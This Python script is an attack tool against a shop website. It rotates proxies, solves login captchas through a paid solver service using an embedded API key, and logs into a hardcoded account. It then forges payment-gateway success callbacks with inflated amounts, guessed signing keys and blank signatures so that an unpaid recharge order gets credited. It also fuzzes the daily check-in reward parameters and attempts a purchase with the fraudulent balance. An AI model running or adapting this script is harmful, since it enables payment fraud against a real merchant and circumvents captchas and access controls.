#!/usr/bin/env python3
"""Try balance tricks: notify amount inflate, zero-sign, return.php, qiandao race."""
import hashlib
import json
import re
import subprocess
import time
import urllib.parse
from datetime import datetime
from pathlib import Path

BASE = "https://qq1.lol"
OUT = Path("/tmp/qq1_deep9")
LOG = OUT / "balance_race.log"
HITS = OUT / "hits.jsonl"
JAR = str(OUT / "br.jar")
KEY = "685ea1068774ca8f8e9a292a08da66d6"
QG, PW = "C413ED6D", "344F550A6F8B"
USER, PASS = "p4764923", "Test64923x"
_px = None


def log(m):
    line = f"[{datetime.now():%H:%M:%S}] {m}"
    print(line, flush=True)
    open(LOG, "a").write(line + "\n")


def hit(kind, detail, body=""):
    open(HITS, "a").write(json.dumps({"kind": kind, "detail": detail, "body": (body or "")[:8000]}, ensure_ascii=False) + "\n")
    log(f"*** HIT [{kind}] {detail}: {(body or '')[:300]}")


def fresh():
    global _px
    for area in ("440000", "0"):
        try:
            d = json.loads(subprocess.check_output(
                ["curl", "-s", "--max-time", "10", f"https://share.proxy.qg.net/query?key={QG}"],
                text=True, timeout=12))
            if d.get("code") != "SUCCESS" or not d.get("data"):
                d = json.loads(subprocess.check_output(
                    ["curl", "-s", f"https://share.proxy.qg.net/get?key={QG}&num=1&area={area}"],
                    text=True, timeout=12))
            for x in d.get("data") or []:
                cand = f"http://{QG}:{PW}@{x['server']}"
                code = subprocess.run(
                    ["curl", "-sk", "--max-time", "10", "-x", cand, "-o", "/tmp/t9.out",
                     "-w", "%{http_code}", f"{BASE}/%61pi.php?act=siteinfo"],
                    capture_output=True, text=True, timeout=14).stdout.strip()
                if code == "200" and b"sitename" in open("/tmp/t9.out", "rb").read():
                    _px = cand
                    log(f"px {x['server']}")
                    return _px
        except Exception as e:
            log(f"px {e}")
        time.sleep(0.5)
    return _px


def curl(url, post=None, mt=18):
    global _px
    if not _px:
        fresh()
    for _ in range(5):
        cmd = ["curl", "-sk", "--max-time", str(mt), "-x", _px, "-b", JAR, "-c", JAR,
               "-A", "Mozilla/5.0", "-H", "Referer: https://qq1.lol/",
               "-H", "X-Requested-With: XMLHttpRequest",
               "-w", "\n__HTTP:%{http_code}"]
        if post is not None:
            body = urllib.parse.urlencode(post) if isinstance(post, dict) else str(post)
            cmd += ["-X", "POST", "--data-binary", body,
                    "-H", "Content-Type: application/x-www-form-urlencoded"]
        cmd.append(url)
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=mt + 8).stdout or ""
        if "authorization expired" in out or "__HTTP:" not in out:
            fresh()
            continue
        b, code = out.rsplit("__HTTP:", 1)
        return b.strip(), code.strip()
    return "", "000"


def login():
    Path(JAR).unlink(missing_ok=True)
    curl(BASE + "/user/login.php")
    for _ in range(5):
        try:
            cap_b, _ = curl(BASE + f"/ajax.php?act=captcha&t={int(time.time()*1000)}")
            cap = json.loads(cap_b)
            task = {"type": "GeeTestTaskProxyless", "websiteURL": BASE + "/user/login.php",
                    "gt": cap["gt"], "challenge": cap["challenge"]}
            d = json.loads(subprocess.check_output(
                ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
                 "-d", json.dumps({"clientKey": KEY, "task": task}),
                 "https://api.2captcha.com/createTask"], text=True, timeout=35))
            if d.get("errorId"):
                raise RuntimeError(str(d))
            tid = d["taskId"]
            log(f"task {tid}")
            sol = None
            for _i in range(35):
                time.sleep(4)
                d = json.loads(subprocess.check_output(
                    ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
                     "-d", json.dumps({"clientKey": KEY, "taskId": tid}),
                     "https://api.2captcha.com/getTaskResult"], text=True, timeout=25))
                if d.get("status") == "ready":
                    sol = d["solution"]
                    break
                if d.get("errorId"):
                    raise RuntimeError(str(d))
            if not sol:
                continue
        except Exception as e:
            log(f"cap {e}")
            continue
        b, c = curl(BASE + "/user/ajax.php?act=login", {
            "user": USER, "pass": PASS,
            "geetest_challenge": sol.get("challenge") or cap["challenge"],
            "geetest_validate": sol.get("validate", ""),
            "geetest_seccode": sol.get("seccode") or (sol.get("validate", "") + "|jordan"),
        })
        log(f"login {c} {(b or '')[:140]}")
        if b and ("成功" in b or '"code":0' in b):
            return True
    return False


def bal():
    home, _ = curl(BASE + "/user/")
    m = re.search(r"余额：([0-9.]+)元", home or "")
    return float(m.group(1)) if m else -1


def main():
    open(LOG, "w").write("")
    log("=== BALANCE RACE ===")
    fresh()
    if not login():
        log("login fail"); return
    log(f"bal={bal()}")

    # create 0.5 recharge
    b, c = curl(f"{BASE}/user/ajax.php?act=recharge&type=alipay&value=0.5")
    log(f"recharge 0.5: {c} {(b or '')[:200]}")
    tn = None
    try:
        tn = json.loads(b).get("trade_no")
    except Exception:
        pass
    if not tn:
        b, c = curl(f"{BASE}/user/ajax.php?act=recharge&type=alipay&value=0.48")
        log(f"recharge 0.48: {c} {(b or '')[:200]}")
        try:
            tn = json.loads(b).get("trade_no")
        except Exception:
            pass
    if not tn:
        log("no trade_no"); return
    hit("recharge_half", tn, b)

    # aggressive notify variants including amount inflate
    paths = ["/other/epay_notify.php", "/other/epay_return.php", "/other/alipay_notify.php"]
    for money in ("0.5", "0.48", "1", "10", "100", "0.01"):
        for pid in ("1000", "1", "1001", ""):
            for key in ("", "123456", "1", "key", "epay"):
                base = {
                    "pid": pid or "1000",
                    "trade_no": tn,
                    "out_trade_no": tn,
                    "type": "alipay",
                    "name": "在线充值余额",
                    "money": money,
                    "trade_status": "TRADE_SUCCESS",
                }
                items = sorted((k, v) for k, v in base.items())
                s = "&".join(f"{k}={v}" for k, v in items)
                sign_list = [
                    hashlib.md5((s + key).encode()).hexdigest(),
                    hashlib.md5((s + "&key=" + key).encode()).hexdigest(),
                    "0", "", "null", "success",
                ]
                for sign in sign_list:
                    p = dict(base)
                    p["sign"] = sign
                    p["sign_type"] = "MD5"
                    for path in paths:
                        bb, cc = curl(BASE + path, p)
                        if bb and bb.strip().lower() in ("success", "ok"):
                            hit("NOTIFY_OK", f"{path} money={money} pid={pid} key={key!r} sign={sign[:12]}", bb)
                            log(f"bal after notify: {bal()}")
                            # try buy
                            b2, c2 = curl(f"{BASE}/%61pi.php?act=pay", {
                                "user": USER, "pass": PASS, "tid": "130", "num": "1",
                                "input1": "race@" + USER,
                            })
                            log(f"buy130: {c2} {(b2 or '')[:250]}")
                            if b2 and "余额不足" not in b2:
                                hit("BUY130", tn, b2)
                            return
                # no-sign raw
                for path in paths:
                    bb, cc = curl(BASE + path, base)
                    if bb and bb.strip().lower() == "success":
                        hit("NOTIFY_NOSIGN", path, bb)
                        return
        # GET return style
        q = urllib.parse.urlencode({
            "out_trade_no": tn, "trade_no": tn, "trade_status": "TRADE_SUCCESS",
            "money": money, "pid": "1000", "type": "alipay", "sign": "0", "sign_type": "MD5",
        })
        bb, cc = curl(BASE + "/other/epay_return.php?" + q)
        log(f"return money={money}: {cc} {(bb or '')[:100]}")

    # qiandao param fuzz
    page, _ = curl(BASE + "/user/qiandao.php")
    m = re.search(r'csrf_token\s*=\s*"([^"]+)"', page or "")
    csrf = m.group(1) if m else ""
    for extra in [
        {"money": "100"}, {"reward": "100"}, {"value": "100"},
        {"num": "100"}, {"day": "999"}, {"continuous": "999"},
    ]:
        data = {"csrf_token": csrf, **extra}
        bb, cc = curl(BASE + "/user/ajax.php?act=qiandao", data)
        log(f"qiandao fuzz {extra}: {cc} {(bb or '')[:120]}")

    log(f"final bal={bal()}")
    # final buy attempt
    b2, c2 = curl(f"{BASE}/%61pi.php?act=pay", {
        "user": USER, "pass": PASS, "tid": "130", "num": "1", "input1": "final@" + USER,
    })
    log(f"final buy130: {c2} {(b2 or '')[:250]}")
    log("=== DONE ===")


if __name__ == "__main__":
    main()
